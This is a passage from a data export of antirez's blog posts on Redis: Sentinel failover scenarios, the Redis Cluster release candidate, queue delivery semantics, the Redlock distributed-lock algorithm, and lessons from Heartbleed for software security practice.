is available again, except it restarted with a totally empty data set. 5. All the slave nodes B, C, D, ... will happily synchronize an empty data set form it.  Everything wiped from the master, as per configuration, after all. And everything wiped from the slaves, that are replicating from what is believed to be the current source of truth for the data set.  Let\u2019s remove Sentinel from the equation, which is, point \u201c3\u201d of the above time line, since Sentinel did not acted at all in the example scenario.  This is what you get. You have a Redis master replicating with N slaves. The master is restarted, configured to start with a fresh (empty) data set. Salves replicate again from it (an empty data set). I think this is not a big news for Redis users, this is how Redis replication works: slaves will always try to be the exact copy of their masters. However let\u2019s consider alternative models.  For example Redis instances could have a Node ID which is persisted in the RDB / AOF file. Every time the node restarts, it loads its Node ID. If the Node ID is wrong, slaves wont replicate from the master at all. Much safer right? Only marginally, actually. The master could have a different misconfiguration, so after a restart, it could reload a data set which is weeks old since snapshotting failed for some reason. So after a bad restart, we still have the right Node ID, but the dataset is so old to be basically, the same as being wiped more or less, just more subtle do detect.  However at the cost of making things only marginally more secure we now have a system that may be more complex to operate, and slaves that are in danger of not replicating from the master since the ID does not match, because of operational errors similar to disabling persistence, except, a lot less obvious than that.  So, let\u2019s change topic, and see a failure mode where Sentinel is *actually* involved, and that can be improved.  Not all replicas are the same ===  Technically Redis Sentinel offers a very limited set of simple to understand guarantees.  1) All the Sentinels will agree about the configuration as soon as they can communicate. Actually each sub-partition will always agree. 2) Sentinels can\u2019t start a failover without an authorization from the majority of Sentinel processes. 3) Failovers are strictly ordered: if a failover happened later in time, it has a greater configuration \u201cnumber\u201d (config epoch in Sentinel slang), that will always win over older configurations. 4) Eventually the Redis instances are configured to map with the winning logical configuration (the one with the greater config epoch).  This means that the dataset semantics is \u201clast failover wins\u201d. However the missing information here is, during a failover, what slave is picked to replace the master? This is, all in all, a fundamental property. For example if Redis Sentinel fails by picking a wiped slave (that just restarted with a wrong configuration), *that* is a problem with Sentinel. Sentinel should make sure that, even within the limits of the fact that Redis is an asynchronously replicated system, it will try to make the best interest of the user by picking the best slave around, and refusing to failover at all if there is no viable slave reachable.  This is a place where improvements are possible, and this is what happens today to select a slave when the master is failing:  1) If a slaves was restarted, and never was connected with the master after the restart, performing a successful synchronization (data transfer), it is skipped. 2) If the slave is disconnected from its master for more than 10 times the configured timeout (the time a master should be not reachable for the set of Sentinels to detect a master as failing), it is considered to be non elegible. 3) Out of the remaining slaves, Sentinel picks the one with the best \u201creplication offset\u201d.  The replication offset is a number that Redis master-slave replication uses to take a count of the amount of bytes sent via the replication channel. it is useful in many ways, not just for failovers. For example in partial resynchronizations after a net split, slaves will ask the master, give me data starting from offset X, which is the last byte I received, and so forth.  However this replication number has two issues when used in the context of picking the best slave to promote.  1) It is reset after restarts. This sounds harmless at first, since we want to pick slaves with the higher number, and anyway, after a restart if a slave can\u2019t connect, it is skipped. However it is not harmless at all, read more. 2) It is just a number: it does not imply that a Redis slave replicated from *a given* master.  Also note that when a slave is promoted to master, it inherits the master\u2019s replication offset. So modulo restarts, the number keeps increasing.  Why \u201c1\u201d and/or \u201c2\u201d are suboptimal choices and can be improved?  Imagine this setup. We have nodes A B C D E. D is the current master, and is partitioned away with E in a minority partition. E still replicates from D, everything is fine from their POV.  However in the majority partition, A B C can exchange messages, and A is elected master. Later A restarts, resetting its offset. B and C replicate from it, starting again with lower offsets. After some time A fails, and, at the same time, E rejoins the majority partition.  E has a data set that is less updated compared to the B and C data set, however its replication offset is higher. Not just that, actually E can claim it was recently connected to its master.  To improve upon this is easy. Each Redis instance has a \u201crunid\u201d, an unique ID that changes for each new Redis run. This is useful in partial resynchronizations in order to avoid getting an incremental stream from a wrong master. Slaves should publish what is the last master run id they replicated successful from, and Sentinel failover should make sure to only pick slaves that replicated from the master they are actually failing over.  Once you tight the replication offset to a given runid, what you get is an *absolute* meter of how much updated a slave is. If two slaves are available, and both can claim continuity with the old master, the one with the higher replication offset is guaranteed to be the best pick.  However this also creates availability concerns in all the cases where data is not very important but availability is. For example if when A crashes, only E becomes available, even if it used to replicate from D, it is still better than nothing. I would say that when you need an highly available cache and consistency is not a big issue, to use a Redis cluster ala-memcached (client side consistent hashing among N masters) is the way to go.  Note that even without checking the runid, to make the replication offsets durable after a restart, already improves the behavior considerably. In the above example E would be picked only if when isolated in a minority partition with the slave, received more writes than the other slaves in the majority side.  TLDR: we have to fix this. It is not related to restarting masters without a dataset, but is useful to have a more correct implementation. However this will limit only a class of very-hard-to-trigger issues.  This is in my TODO list for some time now, and congrats to Aphyr for identifying a real implementation issue in a matter of a few tweets exchanged. About the failure reported by Aphyr from the unknown company, I don\u2019t think it is currently viable to try to protect against serious misconfigurations, however it is a clear sign that we need better Sentinel docs which are more incremental compared to the ones we have now, that try to describe how the system works. A wiser approach could be to start with a common sane configuration, and \u201cdon\u2019t do\u201d list like, don\u2019t turn persistence off, unless you are ok with wiped instances. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2014-10-21T15:18:10Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6219.7829633, "slug": "a-few-arguments-about-redis-sentinel-properties-and-fail-scenarios-60", "topics": []}}, {"model": "app.post", "pk": 61, "fields": {"title": "Redis cluster, no longer vaporware.", "link": "http://antirez.com/news/79", "source": 1, "normalized_link": "antirez.com/news/79", "summary": "The first commit I can find in my git history about Redis Cluster is dated March 29 2011, but it is a \u201ccopy and commit\u201d merge: the history of the cluster branch was destroyed since it was a total mess of work-in-progress commits, just to shape the initial idea of API and interactions with the rest of the system.  Basically it is a roughly 4 years old project. This is about two thirds the whole history of the Redis project. Yet, it is only today, that I\u2019m releasing a Release Candidate, the first one, of Redis 3.0.0, which is the first version with Cluster support.  An erratic run \u2014  To understand why it took so long is straightforward: I started the cluster project with a lot of rush, in a moment where it looked like Redis was going to be totally useless without an automatic way to scale. It was not the right moment to start the Cluster project, simply because Redis itself was too immature, so we didn't yet have a solid \u201csingle instance\u201d story to tell.  While I did the error of starting a project with the wrong timing, at least I didn\u2019t fell in the trap of ignoring the requests arriving from the community, so the project was stopped and stopped an infinite number of times in order to provide more bandwidth to other fundamental features. Persistence, replication, latency, introspection, received a lot more care than cluster, simply because they were more important for the user base.  Another limit of the project was that, when I started it, I had no clue whatsoever about distributed programming. I did a first design that was horrible, and managed to capture well only what were the \u201cproducts\u201d requirement: low latency, linear scalability and small overhead for small clusters. However all the details were wrong, and it was far more complex than it had to be, the algorithms used were unsafe, and so forth.  While I was doing small progresses I started to study the basics of distributed programming, redesigned Redis Cluster, and applied the same ideas to the new version of Sentinel. The distributed programming algorithms used by both systems are still primitive since they are asynchronous replicated, eventually consistent systems, so I had no need to deal with consensus and other non trivial problems. However even when you are addressing a simple problem, compared to writing a CP store at least, you need to understand what you are doing otherwise the resulting system can be totally wrong.  Despite all this problems, I continued to work at the project, trying to fix it, fix the implementation, and bring it to maturity, because there was this simple fact, like an elephant into a small room, permeating all the Redis Community, which is: people were doing again and again, with their efforts, and many times in a totally broken way, two things:  1) Sharding the dataset among N nodes. 2) A responsive failover procedure in order to survive certain failures.  Problem \u201c2\u201d was so bad that at some point I decided to start the Redis Sentinel project before Cluster was finished in order to provide an HA system ASAP, and one that was more suitable than Redis Cluster for the majority of use cases that required just \u201c2\u201d and not \u201c1\u201d.  Finally I\u2019m starting to see the first real-world result of this efforts, and now we have a release candidate that is the fundamental milestone required to get adoption, fix the remaining bugs, and improve the system in a more incremental way.  What it actually does? \u2014  Redis Cluster is basically a data sharding strategy, with the ability to reshard keys from one node to another while the cluster is running, together with a failover procedure that makes sure the system is able to survive certain kinds of failures.  From the point of view of distributed databases, Redis Cluster provides a limited amount of availability during partitions, and a weak form of consistency. Basically it is neither a CP nor an AP system. In other words, Redis Cluster does not achieve the theoretical limits of what is possible with distributed systems, in order to gain certain real world properties.  The consistency model is the famous \u201ceventual consistency\u201d model. Basically if nodes get desynchronized because of partitions, it is guaranteed that when the partition heals, all the nodes serving a given key will agree about its value.  However the merge strategy is \u201clast failover wins\u201d, so writes received during network partitions can be lost. A common example is what happens if a master is partitioned into a minority partition with clients trying to write to it. If when the partition heals, in the majority side of the partition a slave was promoted to replace this master, the writes received by the old master are lost.  This in turn means that Redis Cluster does not have to take meta data in the data structures in order to attempt a value merge, and that the fancy commands and data structures supported by Redis are also supported by Redis Cluster. So no additional memory overhead, no API limits, no limits in the amount of elements a value can contain, but less safety during partitions.  It is trivial to understand that in a system designed like Redis Cluster is, nodes diverging are not good, so the system tries to mitigate its shortcomings by trying to limit the probability of two nodes diverging (and the amount of divergence). This is achieved in a few ways:  1) The minority side of a partition becomes not available. 2) The replication is designed so that usually the reply to the client, and the replication stream to slaves, is sent at the same time. 3) When multiple slaves are available to failover a master, the system will try to pick the one that appears to be less diverging from the failed master.  This strategies don\u2019t change the theoretical properties of the system, but add some more real-world protection for the common Redis Clusters failure modes.  For the Redis API and use case, I believe this design makes sense, but in the past many disagreed. However my opinion is that each designer is free to design a system as she or he wishes, there is just one rule: say the truth, so Redis Cluster documents its limits and failure modes clearly in the official documentation.  It\u2019s the user, and the use case at hand, that will make a system useful or not. My feeling is that after six years users continued to use Redis even without any clustering support at all, because the use case made this possible, and Redis offers certain specific features and performances that made it very suitable to address certain problems. My hope is that Redis Cluster will improve the life of many of those users.  The road ahead \u2014  Finally we have a minimum viable product to ship, which is stable enough for users to seriously start testing and in certain cases adopt it already. The more adoption, the more we improve it. I know this from Redis and Sentinel: now there is the incremental process that moves a software forward from usable to mature. Listening to users, fixing bugs, covering more code in tests, \u2026  At the same time, I\u2019m starting to think at the next version of Redis Cluster, improving v1 with many useful things that was not possible to add right now, like multi data center support, more write safety in the minority partition using commands replay, automatic nodes balancing (now there is to reshard manually if certain nodes are too empty and other too full), and many more things.  Moreover, I believe Redis Cluster could benefit from a special execution mode specifically designed for caching, where nodes accept writes to hash slots they are not in charge for, in order to stay available in a minority partition.  There is always time to improve and fix our implementation and designs, but focusing too much on how we would like some software to be, has the risk of putting it in the vaporware category for far longer than needed. It\u2019s time to let it go. Enjoy Redis Cluster!  Redis Cluster RC1 is available both as '3.0.0-rc1' tag at Github, or as a tarball in the Redis.io download page at http://redis.io/download Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2014-10-09T14:35:23Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6196.6859189, "slug": "redis-cluster-no-longer-vaporware-61", "topics": []}}, {"model": "app.post", "pk": 62, "fields": {"title": "Queues and databases", "link": "http://antirez.com/news/78", "source": 1, "normalized_link": "antirez.com/news/78", "summary": "Queues are an incredibly useful tool in modern computing, they are often used in order to perform some possibly slow computation at a latter time in web applications. Basically queues allow to split a computation in two times, the time the computation is scheduled, and the time the computation is executed. A \u201cproducer\u201d, will put a task to be executed into a queue, and a \u201cconsumer\u201d or \u201cworker\u201d will get tasks from the queue to execute them. For example once a new user completes the registration process in a web application, the web application will add a new task to the queue in order to send an email with the activation link. The actual process of sending an email, that may require retrying if there are transient network failures or other errors, is up to the worker.  Technically speaking we can think at queues as a form of inter-process messaging primitive, where the receiving process needs to acknowledge the reception of the message. Messages can not be fire-and-forget, since the queue needs to understand if the message can be removed from the queue, so some form of acknowledgement is strictly required.  When receiving a message triggers the execution of a task, like it happens in the kind of queues we are talking about, the moment the message reception is acknowledged changes the semantic of the queue. When the worker process acknowledges the reception of the message *before* processing the message, if the worker fails the message can be lost before the task is performed at all. If the acknowledge is sent only *after* the message gets processed, if the worker fails or because of network partitions the queue may re-deliver the message again. This happens whatever the queue consistency properties are, so, even if the queue is modeled using a system providing strong consistency, the indetermination still holds true:  * If messages are acknowledged before processing, the queue will have an at-most-once delivery property. This means messages can be processed zero or one time. * If messages are acknowledged after processing, the queue will have an at-least-once delivery property. This means messages can be processed from 1 to infinite number of times.  While both of this cases are not perfect, in the real world the second behavior is often preferred, since it is usually much simpler to cope with the case of multiple delivery of the message (triggering multiple executions of the task) than a system that from time to time does not execute a given task at all. An example of at-least-once delivery system is Amazon SQS (Simple Queue Service).  There is also a fundamental reason why at-least-once delivery systems are to be preferred, that has to do with distributed systems: the other semantics (at-most-once delivery) requires the queue to be strongly consistent: once the message is acknowledged no other worker must be able to acknowledge the same message, which is a strong property.  Once we move our focus to at-least-once delivery systems, we may notice that to model the queue with a CP system is a waste, and also a disadvantage:  * Anyway, we can\u2019t guarantee more than at-least-once delivery. * Our queue lose the ability to work into a minority side of a network partition. * Because of the consistency requirements the queue needs agreement, so we are burning performances and adding latency without any good reason.  Since messages may be delivered multiple times, what we want conceptually is a commutative data structure and an eventually consistent system. Messages can be stored into a set data structure replicated into N nodes, with the merge function being the union among the sets. Acknowledges, received by workers after execution of messages, are also conceptually elements of the set, marking a given element as processed. This is a trivial example which is not particularly practical for a real world system, but shows how a given kind of queue is well modeled by a given set of properties of a distributed system.  Practically speaking there are other useful things our queue may try to provide:  * Guaranteed delivery to a single worker at least for a window of time: while multiple delivery is allowed, we want to avoid it as much as possible. * Best-effort checks to avoid to re-delivery a message after a timeout if the message was already processed. Again, we can\u2019t guarantee this property, but we may try hard to reduce re-issuing a message which was actually already processed. * Enough internal state to handle, during normal operations, messages as a FIFO, so that messages arriving first are processed first. * Auto cleanup of the internal data structures.  On top of this we need to retain messages during network partitions, so that conceptually (even if practically we could use different data structures) the set of messages to deliver are the union of all the messages of all the nodes.  Unfortunately while many Redis based queues implementations exist, no one try to use N Redis independent nodes and the offered primitives as a building block for a distributed system with such characteristics. Using Redis data structures and performances, and algorithms providing certain useful guarantees, may provide a queue system which is very practical to use, easy to administer and scale, while providing excellent performances (messages / second) per node.  Because I find the topic is interesting and this is an excellent use case for Redis, I\u2019m very slowly working at a design for such a Redis based queue system. I hope to show something during the next weeks, time permitting. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2014-07-14T09:53:34Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 6029.2701633, "slug": "queues-and-databases-62", "topics": []}}, {"model": "app.post", "pk": 63, "fields": {"title": "A proposal for more reliable locks using Redis", "link": "http://antirez.com/news/77", "source": 1, "normalized_link": "antirez.com/news/77", "summary": "----------------- UPDATE: The algorithm is now described in the Redis documentation here => http://redis.io/topics/distlock. The article is left here in its older version, the updates will go into the Redis documentation instead. -----------------  Many people use Redis to implement distributed locks. Many believe that this is a great use case, and that Redis worked great to solve an otherwise hard to solve problem. Others believe that this is totally broken, unsafe, and wrong use case for Redis.  Both are right, basically. Distributed locks are not trivial if we want them to be safe, and at the same time we demand high availability, so that Redis nodes can go down and still clients are able to acquire and release locks. At the same time a fast lock manager can solve tons of problems which are otherwise hard to solve in practice, and sometimes even a far from perfect solution is better than a very slow solution.  Can we have a fast and reliable system at the same time based on Redis? This blog post is an exploration in this area. I\u2019ll try to describe a proposal for a simple algorithm to use N Redis instances for distributed and reliable locks, in the hope that the community may help me analyze and comment the algorithm to see if this is a valid candidate.  # What we really want?  Talking about a distributed system without stating the safety and liveness properties we want is mostly useless, because only when those two requirements are specified it is possible to check if a design is correct, and for people to analyze and find bugs in the design. We are going to model our design with just three properties, that are what I believe the minimum guarantees you need to use distributed locks in an effective way.  1) Safety property: Mutual exclusion. At any given moment, only one client can hold a lock.  2) Liveness property A: Deadlocks free. Eventually it is always possible to acquire a lock, even if the client that locked a resource crashed or gets partitioned.  3) Liveness property B: Fault tolerance. As long as the majority of Redis nodes are up, clients are able to acquire and release locks.  # Distributed locks, the naive way.  To understand what we want to improve, let\u2019s analyze the current state of affairs.  The simple way to use Redis to lock a resource is to create a key into an instance. The key is usually created with a limited time to live, using Redis expires feature, so that eventually it gets released one way or the other (property 2 in our list). When the client needs to release the resource, it deletes the key.  Superficially this works well, but there is a problem: this is a single point of failure in our architecture. What happens if the Redis master goes down? Well, let\u2019s add a slave! And use it if the master is unavailable. This is unfortunately not viable. By doing so we can\u2019t implement our safety property of the mutual exclusion, because Redis replication is asynchronous.  This is an obvious race condition with this model:  1) Client A acquires the lock into the master.  2) The master crashes before the write to the key is transmitted to the slave.  3) The slave gets promoted to master.  4) Client B acquires the lock to the same resource A already holds a lock for.  Sometimes it is perfectly fine that under special circumstances, like during a failure, multiple clients can hold the lock at the same time. If this is the case, stop reading and enjoy your replication based solution. Otherwise keep reading for a hopefully safer way to implement it.  # First, let\u2019s do it correctly with one instance.  Before to try to overcome the limitation of the single instance setup described above, let\u2019s check how to do it correctly in this simple case, since this is actually a viable solution in applications where a race condition from time to time is acceptable, and because locking into a single instance is the foundation we\u2019ll use for the distributed algorithm described here.  To acquire the lock, the way to go is the following:  SET resource_name my_random_value NX PX 30000  The command will set the key only if it does not already exist (NX option), with an expire of 30000 milliseconds (PX option). The key is set to a value \u201cmy_random_value\u201d. This value requires to be unique across all the clients and all the locks requests.  Basically the random value is used in order to release the lock in a safe way, with a script that tells Redis: remove the key only if exists and the value stored at the key is exactly the one I expect to be. This is accomplished by the following Lua script:  if redis.call(\"get\",KEYS[1]) == ARGV[1] then     return redis.call(\"del\",KEYS[1]) else     return 0 end  This is important in order to avoid removing a lock that was created by another client. For example a client may acquire the lock, get blocked into some operation for longer than the lock validity time (the time at which the key will expire), and later remove the lock, that was already acquired by some other client. Using just DEL is not safe as a client may remove the lock of another client. With the above script instead every lock is \u201csigned\u201d with a random string, so the lock will be removed only if it is still the one that was set by the client trying to remove it.  What this random string should be? I assume it\u2019s 20 bytes from /dev/urandom, but you can find cheaper ways to make it unique enough for your tasks. For example a safe pick is to seed RC4 with /dev/urandom, and generate a pseudo random stream from that. A simpler solution is to use a combination of unix time with microseconds resolution, concatenating it with a client ID, it is not as safe, but probably up to the task in most environments.  The time we use as the key time to live, is called the \u201clock validity time\u201d. It is both the auto release time, and the time the client has in order to perform the operation required before another client may be able to acquire the lock again, without technically violating the mutual exclusion guarantee, which is only limited to a given window of time from the moment the lock is acquired.  So now we have a good way to acquire and release the lock. The system, reasoning about a non-distrubited system which is composed of a single instance, always available, is safe. Let\u2019s extend the concept to a distributed system where we don\u2019t have such guarantees.  # Distributed version  In the distributed version of the algorithm we assume to have N Redis masters. Those nodes are totally independent, so we don\u2019t use replication or any other implicit coordination system. We already described how to acquire and release the lock safely in a single instance. We give for granted that the algorithm will use this method to acquire and release the lock in a single instance. In our examples we set N=5, which is a reasonable value, so we need to run 5 Redis masters in different computers or virtual machines in order to ensure that they\u2019ll fail in a mostly independent way.  In order to acquire the lock, the client performs the following operations:  Step 1) It gets the current time in milliseconds.  Step 2) It tries to acquire the lock in all the N instances sequentially, using the same key name and random value in all the instances.  During the step 2, when setting the lock in each instance, the client uses a timeout which is small compared to the total lock auto-release time in order to acquire it. For example if the auto-release time is 10 seconds, the timeout could be in the ~ 5-50 milliseconds range. This prevents the client to remain blocked for a long time trying to talk with a Redis node which is down: if an instance is not available, we should try to talk with the next instance ASAP.  Step 3) The client computes how much time elapsed in order to acquire the lock, by subtracting to the current time the timestamp obtained in step 1. If and only if the client was able to acquire the lock in the majority of the instances (at least 3), and the total time elapsed to acquire the lock is less than lock validity time, the lock is considered to be acquired.  Step 4) If the lock was acquired, its validity time is considered to be the initial validity time minus the time elapsed, as computed in step 3.  Step 5) If the client failed to acquire the lock for some reason (either it was not able to lock N/2+1 instances or the validity time is negative), it will try to unlock all the instances (even the instances it believe it was not able to lock).  # Synchronous or not?   Basically the algorithm is partially synchronous: it relies on the assumption that while there is no synchronized clock across the processes, still the local time in every process flows approximately at the same rate, with an error which is small compared to the auto-release time of the lock. This assumption closely resembles a real-world computer: every computer has a local clock and we can usually rely on different computers to have a clock drift which is small.  Moreover we need to refine our mutual exclusion rule: it is guaranteed only as long as the client holding the lock will terminate its work within the lock validity time (as obtained in step 3), minus some time (just a few milliseconds in order to compensate for clock drift between processes).  # Retry  When a client is not able to acquire the lock, it should try again after a random delay in order to try to desynchronize multiple clients trying to acquire the lock, for the same resource, at the same time (this may result in a split brain condition where nobody wins). Also the faster a client will try to acquire the lock in the majority of Redis instances, the less window for a split brain condition (and the need for a retry), so ideally the client should try to send the SET commands to the N instances at the same time using multiplexing.  It is worth to stress how important is for the clients that failed to acquire the majority of locks, to release the (partially) acquired locks ASAP, so that there is no need to wait for keys expiry in order for the lock to be acquired again (however if a network partition happens and the client is no longer able to communicate with the Redis instances, there is to pay an availability penalty and wait for the expires).  # Releasing the lock  Releasing the lock is simple and involves just to release the lock in all the instances, regardless of the fact the client believe it was able to successfully lock a given instance.  # Safety arguments  Is this system safe? We can try to understand what happens in different scenarios.  To start let\u2019s assume that a client is able to acquire the lock in the majority of instances. All the instances will contain a key with the same time to live. However the key was set at different times, so the keys will also expire at different times. However if the first key was set at worst at time T1 (the time we sample before contacting the first server) and the last key was set at worst at time T2 (the time we obtained the reply from the last server), we are sure that the first key to expire in the set will exist for at least MIN_VALIDITY=TTL-(T2-T1)-CLOCK_DRIFT. All the other keys will expire later, so we are sure that the keys will be simultaneously set for at least this time.  During the time the majority of keys are set, another client will not be able to acquire the lock, since N/2+1 SET NX operations can\u2019t succeed if N/2+1 keys already exist. So if a lock was acquired, it is not possible to re-acquire it at the same time (violating the mutual exclusion property).  However we want to also make sure that multiple clients trying to acquire the lock at the same time can\u2019t simultaneously succeed.  If a client locked the majority of instances using a time near, or greater, than the lock maximum validity time (the TTL we use for SET basically), it will consider the lock invalid and will unlock the instances, so we only need to consider the case where a client was able to lock the majority of instances in a time which is less than the validity time. In this case for the argument already expressed above, for MIN_VALIDITY no client should be able to re-acquire the lock. So multiple clients will be albe to lock N/2+1 instances at the same time (with \u201ctime\" being the end of Step 2) only when the time to lock the majority was greater than the TTL time, making the lock invalid.  Are you able to provide a formal proof of safety, or to find a bug? That would be very appreciated.  # Liveness arguments  The system liveness is based on three main features:  1) The auto release of the lock (since keys expire): eventually keys are available again to be locked.  2) The fact that clients, usually, will cooperate removing the locks when the lock was not acquired, or when the lock was acquired and the work terminated, making it likely that we don\u2019t have to wait for keys to expire to re-acquire the lock.  3) The fact that when a client needs to retry a lock, it waits a time which is comparable greater to the time needed to acquire the majority of locks, in order to probabilistically make split brain conditions during resource contention unlikely.  However there is at least a scenario where a very special network partition/rejoin pattern, repeated indefinitely, may violate the system availability. For example with N=5, two clients A and B may try to lock the same resource at the same time, nobody will be able to acquire the majority of locks, but they may be able to lock the majority of nodes if we sum the locks of A and B (for example client A locked 2 instances, client B just one instance). Then the clients are partitioned away before they can unlock the locked instances. This will leave the resource not lockable for a time roughly equal to the auto release time. Then when the keys expire, the two clients A and B join again the partition repeating the same pattern, and so forth indefinitely.  Another point of view to see the problem above, is that we pay an availability penalty equal to \u201cTTL\u201d time on network partitions, so if there are continuous partitions, we can pay this penalty indefinitely.  I can\u2019t find a simple way to have guaranteed liveness (but did not tried very hard honestly), but the worst case appears to be hard to trigger. Basically it means that we can only provide, using this algorithm, an approximation of Property number 2.  # Performance, crash-recovery and fsync  Many users using Redis as a lock server need high performance in terms of both latency to acquire and release a lock, and number of acquire / release operations that it is possible to perform per second. In order to meet this requirement, the strategy to talk with the N Redis servers to reduce latency is definitely multiplexing (or poor\u2019s man multiplexing, which is, putting the socket in non-blocking mode, send all the commands, and read all the commands later, assuming that the RTT between the client and each instance is similar).  However there is another consideration to do about persistence if we want to target a crash-recovery system model.  Basically to see the problem here, let\u2019s assume we configure Redis without persistence at all. A client acquires the lock in 3 of 5 instances. One of the instances where the client was able to acquire the lock is restarted, at this point there are again 3 instances that we can lock for the same resource, and another client can lock it again, violating the safety property of exclusivity of lock.  If we enable AOF persistence, things will improve quite a bit. For example we can upgrade a server by sending SHUTDOWN and restarting it. Because Redis expires are semantically implemented so that virtually the time still elapses when the server is off, all our requirements are fine. However everything is fine as long as it is a clean shutdown. What about a power outage? If Redis is configured, as by default, to fsync on disk every second, it is possible that after a restart our key is missing. Long story short if we want to guarantee the lock safety in the face of any kind of instance restart, we need to enable fsync=always in the persistence setting. This in turn will totally ruin performances to the same level of CP systems that are traditionally used to implement distributed locks in a safe way.  The good news is that because in our algorithm we don\u2019t stop to acquire locks as soon as we reach the majority of the servers, the actual probability of safety violation is small, because most of the times the lock will be hold in all the 5 servers, so even if one restarts without a key, it is practically unlikely (but not impossible) that an actual safety violation happens. Long story short, this is an user pick, and a big trade off. Given the small probability for a race condition, if it is acceptable that with an extremely small probability, after a crash-recovery event, the lock may be acquired at the same time by multiple clients, the fsync at every operation can (and should) be avoided.  # Reference implementation  I wrote a simple reference implementation in Ruby, backed by redis-rb, here: http://github.com/antirez/redlock-rb  # Want to help?  If you are into distributed systems, it would be great to have your opinion / analysis. Also reference implementations in other languages could be great.  Thanks in advance!  EDIT: I received feedbacks in this blog post comment and via Hacker News that's worth to incorporate in this blog post.  1) As Steven Benjamin notes in the comments below, if after restarting an instance we can make it unavailable for enough time for all the locks that used this instance to expire, we don't need fsync. Actually we don't need any persistence at all, so our safety guarantee can be provided with a pure in-memory configuration.  An example: previously we described the example race condition where a lock is obtained in 3 servers out of 5, and one of the servers where the lock was obtained restarts empty: another client may acquire the same lock by locking this server and the other two that were not locked by the previous client. However if the restarted server is not available for queries enough time for all the locks that were obtained with it to expire, we are guaranteed this race is no longer possible.  2) The Hacker News user eurleif noticed how it is possible to reacquire the lock as a strategy if the client notices it is taking too much time in order to complete the operation. This can be done by just extending an existing lock, sending a script that extends the expire of the value stored at the key is the expected one. If there are no new partitions, and we try to extend the lock enough in advance so that the keys will not expire, there is the guarantee that the lock will be extended.  3) The Hacker News user mjb noted how the term \"skew\" is not correct to describe the difference of the rate at which different clocks increment their local time, and I'm actually talking about \"Drift\". I'm replacing the word \"skew\" with \"drift\" to use the correct term.  Thanks for the very useful feedbacks. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2014-05-16T11:15:32Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5916.0994522, "slug": "a-proposal-for-more-reliable-locks-using-redis-63", "topics": []}}, {"model": "app.post", "pk": 64, "fields": {"title": "Using Heartbleed as a starting point", "link": "http://antirez.com/news/76", "source": 1, "normalized_link": "antirez.com/news/76", "summary": "The strong reactions about the recent OpenSSL bug are understandable: it is not fun when suddenly all the internet needs to be patched. Moreover for me personally how trivial the bug is, is disturbing. I don\u2019t want to point the finger to the OpenSSL developers, but you just usually think at those class of issues as a bit more subtle, in the case of a software like OpenSSL. Usually you fail to do sanity checks *correctly*, as opposed to this bug where there is a total *lack* of bound checks in the memcpy() call.  However sometimes in the morning I read the code I wrote the night before and I\u2019m deeply embarrassed. Programmers sometimes fail, I for sure do often, so my guess is that what is needed is a different process, and not a different OpenSSL team.  There is who proposes a different language safer than C, and who proposes that the specification is broken because it is too complex. Probably there is some truth in both arguments, however it is unlikely that we move to a different specification or system language soon, so the real question is, what we can do now to improve system software security?  1) Throw money at it.  Making system code safer is simple if there are investments. If different companies hire security experts to do code auditings in the OpenSSL code base, what happens is that the probability of discovering a bug like heartbleed is greater.  I\u2019ve seen very complex bugs that are triggered by a set of non-trivial conditions being discovered by serious code auditing efforts. A memcpy() without bound checks is something that if you analyze the code security-wise, will stand out in the first read. And guess how heartbleed was discovered? Via security auditings performed at Google.  Probably the time to consider open source something that mostly we take from is over. Many companies should follow the example of Google and other companies, using workforce for OSS software development and security.  2) Static and dynamic checks.  Static code analysis is, as a side effect, a semi-automated way to do code auditings. In critical system code like OpenSSL even to do some source code annotation or use a set of rules to make static analysis more effective is definitely acceptable.  Static tools today are not a total solution, but the output of a static analysis if carefully inspected by an expert programmer can provide some value.  Another great help comes from dynamic checks like Valgrind. Every system software written in C should be tested using Valgrind automatically at every new commit.  3) Abstract C with libraries.  C is low level and has no built in safety in the language. However something good about C is that it is a language that allows to build layers on top of its rawness.  A sane dynamic string library prevents a lot of buffer overflow issues, and today almost every decent project is using one. However there is more you can do about it. For example for security critical code where memory can contain things like private keys, you can augment your dynamic string library with memory copy primitives that only copy from one buffer to the other performing implicit sanity checks.  Moreover if a buffer contains critical data, you can set logical permissions so that trying to copy from this area aborts the program. There are other less-portable ways using memory management to protect important memory pages in an even more effective ways, however an higher C-level protection can be much simpler in the real-world because of portability / predictability concerns.  In general many things can be explored to avoid using C without protections, creating a library that abstracts on top of it to make programming safer.  4) Randomized tests.  Unit tests are unlikely to trigger edge cases and failed sanity checks. There is a class of tests that is known since decades that is, in my opinion, not used enough: fuzzy testing.  The OpenSSL bug was definitely discoverable by sending different kind of OpenSSL packets with different randomized parameters, in conjunction with dynamic analysis tools like Valgrind.  In my experience having a great deal of randomized tests together with an environment where the same tests are ran again and again with the program running over Valgrind, can discover a number of real-world bugs that gets otherwise unnoticed. There are many models to explore, usually you want something that injects totally random data, and intermediate models where valid packets are corrupted in different random ways.  A typical example of this technique is the old DNS compression infinite-loop bug. Trow a few random packets to a naive implementation and you\u2019ll find it in a matter of minutes.  5) Change of mentality about security vs performance.  It is interesting that OpenSSL is doing its own allocation caching stuff because in some systems malloc/free is slow. This is a sign that still performances, even in security critical code, is regarded with too much respect over safety. In this specific instance, it must be admitted that probably when the OpenSSL developers wrapped malloc, they never though of security implications by doing so. However the fact that they cared about a low-level detail like the allocation functions in *some* system is a sign of deep concerns about performances, while they should be more deeply concerned about the correctness / safety of the system.  In general it does not help the fact that the system that is the de facto standard in today\u2019s servers infrastructure, that is, Linux, has had, and still has, one of the worst allocators you will find around, mostly for licensing concerns, since the better allocators are not GPL but BSD licensed.  Probably yet another area where big corps should contribute, by providing significant improvements to glibc malloc. Glibc malloc is, even if better alternatives are available, what many real-world system softwares are going to use anyway.  I would love to see the discussion about heartbleed to take a more pragmatic approach, because one thing is guaranteed: to blame here or there will not change the actual level of the security of OpenSSL or anything else, and there are new challenges in the future. For example the implementation of HTTP/2.0 may be a very delicate moment security wise.  EDIT: 